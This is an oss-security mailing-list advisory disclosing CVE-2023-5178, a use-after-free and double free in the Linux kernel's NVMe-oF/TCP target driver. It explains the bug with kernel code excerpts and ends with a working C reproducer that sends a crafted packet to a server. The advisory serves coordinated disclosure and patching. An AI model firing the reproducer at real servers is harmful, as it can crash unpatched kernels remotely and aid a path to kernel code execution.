Received: (qmail 16348 invoked by uid 550); 15 Oct 2023 15:47:21 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 14250 invoked from network); 15 Oct 2023 15:43:03 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1697384572; x=1697989372; darn=lists.openwall.com;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=CBztTFfFYg5tI3pT4YD4ywX9n6Wd0rjYhdg5Hmpbp6w=;
        b=eM672TuUaPAWH2f8Ag3mhjKsiuNAz84U5jBM2hKA6M6FfCVRwXTlQMqyz2UzWONrnV
         dJQiO/e0nKqu6WLc8u+6544lsNt9BUpfTfiJMNG+XlW5N77TPbdGXtqrh7QBPQj444Iq
         LRBMkyxQKGoOlU8bC3DBR+0+bVns9FS+r8fmmPuM4j4+PhPuy6EJMqcFpem3urLoOKYm
         4soShQo3ot6SFhIJNx7eqyYD7DFMIm4/7dQNyOW/zwUBJ6RFshvbPFwsg3AZAqXb7iUs
         TTqgc66UMoJlaRgEvM90MWf0j7nHCFnvJnam2YZBuqBRDnK/XXFIAvu25zpN1B4IBv86
         P73Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1697384572; x=1697989372;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=CBztTFfFYg5tI3pT4YD4ywX9n6Wd0rjYhdg5Hmpbp6w=;
        b=oxJvOj+rE2n0PPKHkYAqeq+ELimGAsgndGjZ3yTo0x2+cDEpf+mQCBACqRvvQekHq9
         RMsnAzUfnAi0Ur14Ptt48XoHZ8aWTIk1ESfX/yIzx7JaHFMY7vOCsRvSO6cxAHhQZcpw
         xDThB6+Q5EzbdySB5Ol5Qk2P1gz492sUe2BFNrgAd/hUDXs7uXR4NusvGsslVW6XNDRy
         2xuR7WTBQ0S4NFNE4VJaW0CYmPGZH8+AeJWph82I5OKKBfFOVXpYSlyj9yHJ7WAH0RSP
         jKmuHCdlShty13Q19yYum9o+G0qLBk5MbT11IQ1kJWnO1VAkijw2FmVdx8nosNztUCzK
         ixOQ==
X-Gm-Message-State: AOJu0YzPQaYT2ISA4hEceyjJh2Qaa4fe5UQoB0sVqbmZSb9Q98W6A4vN
	BE3PF0NsN7WoaiTIVGy+FDPRoKsPD3bwR/jRQ71vg+rqhQjzOA==
X-Google-Smtp-Source: AGHT+IHI7jkbkHGsZTw6ALlZhLyaYUwBoaZBAMTtDB8aX4ZbnuAJa2aVEfQZv6YBmihqkQnJrUN7UEu/PPl47Jhga0U=
X-Received: by 2002:a17:907:7f0a:b0:9b8:df8e:cbd0 with SMTP id
 qf10-20020a1709077f0a00b009b8df8ecbd0mr4472963ejc.37.1697384571867; Sun, 15
 Oct 2023 08:42:51 -0700 (PDT)
MIME-Version: 1.0
From: Alon Zahavi <zahavi.alon@gmail.com>
Date: Sun, 15 Oct 2023 18:42:40 +0300
Message-ID: <CAK5usQs507yNj3CgrjZWF5kVcELZ+tOXaxK0Q0esrskVat0LZw@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] CVE-2023-5178: Linux NVMe-oF/TCP Driver - UAF in `nvmet_tcp_free_crypto`

After disclosing the issue with the linux-distros mailing list and the
maintainers of the NVMe-oF/TCP subsystem, I am reporting the security
issue publicly here.
The patch is at work and will be available soon.
You may follow the patch here:
https://lore.kernel.org/all/20231004173226.5992-1-sj@kernel.org/T/

This vulnerability was assigned with CVE-2023-5178.

## Bug Summary:

Due to a logical bug in the NVMe-oF/TCP subsystem in the Linux kernel,
a malicious actor, with the ability to send messages to the
NVMe-oF/TCP server (either LAN or WAN), can cause a UAF and a double
free, which may lead to remote kernel code execution.

## Bug Location

`drivers/nvme/target/tcp.c` in the function `nvmet_tcp_free_crypto`

From the introduction of NVMe-oF/TCP and up until the fix that would come.

## Technical Details

### In a few words:

The function `nvmet_tcp_free_crypto` is called twice, thus freeing
some pointers twice. Also, it dereferencing a freed address.

```

static void nvmet_tcp_free_crypto(struct nvmet_tcp_queue *queue)

{

        struct crypto_ahash *tfm =3D crypto_ahash_reqtfm(queue->rcv_hash);


        ahash_request_free(queue->rcv_hash);
        ahash_request_free(queue->snd_hash);
        crypto_free_ahash(tfm);

}

```


### In More Details:

****** First Free ******

The NVMe/TCP subsystem uses a queue (`nvmet_tcp_queue`), in which it
has two `struct ahash_request` fields (`rcv_hash` and `snd_hash`).

Following is the `nvmet_tcp_handle_icreq()` function.


```

static int nvmet_tcp_handle_icreq(struct nvmet_tcp_queue *queue)

{

...

        if (le32_to_cpu(icreq->hdr.plen) !=3D sizeof(struct nvme_tcp_icreq_=
pdu)) {

                pr_err("bad nvme-tcp pdu length (%d)\n",
                           le32_to_cpu(icreq->hdr.plen));

                nvmet_tcp_fatal_error(queue); // [1]

        }

...

        if (queue->hdr_digest || queue->data_digest) {

                ret =3D nvmet_tcp_alloc_crypto(queue); // [2]

                if (ret)

                        return ret;

       }

...

        ret =3D kernel_sendmsg(queue->sock, &msg, &iov, 1, iov.iov_len); //=
 [3]

        if (ret < 0)

                 goto free_crypto; // [4]

...

free_crypto:

        if (queue->hdr_digest || queue->data_digest)

        nvmet_tcp_free_crypto(queue); // [5]

        return ret;

}

```


[1] - In case the condition isn=E2=80=99t met, there is a call to
`nvmet_tcp_fatal_error`, which in there a `kernel_sock_shutdown`
operation is being called, to shut down the socket inside the NVMe
queue.

[2] - Afterwards, we allocate the crypto fields of the queue
(`snd_hash` and `rcv_hash`).

[3] - We try to send a message with the shut-downed socket, and when
it fails we go to `free_crypto` label ([4]).

[5] - We call `nvmet_tcp_free_crypto` for the first time.


****** Second Free ******

When the TCP session ends, the function `nvmet_tcp_release_queue_work`
is called by the subsystem.


```

static void nvmet_tcp_release_queue_work(struct work_struct *w)

{

...

        if (queue->hdr_digest || queue->data_digest)

        nvmet_tcp_free_crypto(queue);

...

}

```


In that function, we call `nvmet_tcp_free_crypto` with the same queue
from before thus triggering the bug.

Looking back on the `nvmet_tcp_free_crypto` function we can see the followi=
ng:


1. `struct crypto_ahash *tfm =3D crypto_ahash_reqtfm(queue->rcv_hash);`
- The second call to the crypto free function will cause a
dereferencing of a pointer from a freed object (UAF). That `tfm`
variable will later use its `tfm->exit()` function pointer, thus
leading to code execution.

2. `ahash_request_free(queue->rcv_hash);` - A double free of a
`kmalloc-96` object, leading to memory corruption with undefined
behaviour. Also, it may lead to kernel code execution with the proper
exploitation

3. `ahash_request_free(queue->snd_hash);` - Same as the second bullet above.

4. `crypto_free_ahash(tfm);` - Here `tfm->exit()` is called.


## Reproducing

### Environment:
Any Linux machine with NVMe-oF/TCP enabled (Linux version 5.15 and above).

here is how to configure NVMe-of/TCP on the machine -
https://www.linuxjournal.com/content/data-flash-part-iii-nvme-over-fabrics-=
using-tcp


### Execution:
I am adding a reproducer generated by Syzkaller with some
optimizations and minor changes.


```
#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

uint64_t r[1] =3D {0xffffffffffffffff};

void loop(void)
{
intptr_t res =3D 0;
  res =3D syscall(__NR_socket, /*domain=3D*/2ul, /*type=3D*/1ul, /*proto=3D=
*/0);
  if (res !=3D -1)
    r[0] =3D res;
  *(uint16_t*)0x20000100 =3D 2;
  *(uint16_t*)0x20000102 =3D htobe16(0x1144); // Service port
  *(uint32_t*)0x20000104 =3D htobe32(0xc0a8eb8b); // Service IP
  syscall(__NR_connect, /*fd=3D*/r[0], /*addr=3D*/0x20000100ul, /*addrlen=
=3D*/0x10ul);
  memcpy((void*)0x20000240,
         "\x00\x08\x80\x5d\xe3\x00\x00\x00\x00\x00\x00\x02\x04\x09\x00\x00\=
x6f"
         "\x30\x0d\x02\xef\x84\x31\x0f\xc3\xab\xf2\xd4\x12\x9f\xab\x6a\x3c\=
x50"
         "\x84\x95\x9b\x43\x4e\x06\x22\xf9\x00\x8a\xd0\x8e\x92\x95\x5b\x99\=
x18"
         "\x28\xfb\xa9\x14\x12\x2d\xcb\x00\x65\x2b\x3f\x12\xf8\xf8\xd6\x0a\=
x80"
         "\x0d\x10\x36\xc1\x1a\x39\x46\x00\x00\x00\x00\x00\x00\x00\xed\x07\=
x1d"
         "\x37\xe4\xd0\xdf\x0d\x31\x2f\xfd\xaa\x1f\xbe\xe4\x8f\x72\x3d\xc5\=
x1b"
         "\x5a\x52\x07\x64\xcc\xbb\x0e\x65\xa7\xc1\x01\xbd\xed\x7e\xe2\x0b\=
xdc"
         "\x53\x13\xbd\xa7\xea\xea\x5f\xcc\xa1\x6e\x2e\xa4\x85\x99\x8b\x04\=
x21"
         "\x3e\x4c\x00\x00\x00\x00\x00\x00",
         144);
  syscall(__NR_sendto, /*fd=3D*/r[0], /*pdu=3D*/0x20000240ul, /*len=3D*/0x8=
0ul,
          /*f=3D*/0ul, /*addr=3D*/0ul, /*addrlen=3D*/0ul);
}

int main(void)
{
  syscall(__NR_mmap, /*addr=3D*/0x1ffff000ul, /*len=3D*/0x1000ul, /*prot=3D=
*/0ul,
          /*flags=3D*/0x32ul, /*fd=3D*/-1, /*offset=3D*/0ul);
  syscall(__NR_mmap, /*addr=3D*/0x20000000ul, /*len=3D*/0x1000000ul, /*prot=
=3D*/7ul,
          /*flags=3D*/0x32ul, /*fd=3D*/-1, /*offset=3D*/0ul);
  syscall(__NR_mmap, /*addr=3D*/0x21000000ul, /*len=3D*/0x1000ul, /*prot=3D=
*/0ul,
          /*flags=3D*/0x32ul, /*fd=3D*/-1, /*offset=3D*/0ul);
  loop();
  return 0;
}

```
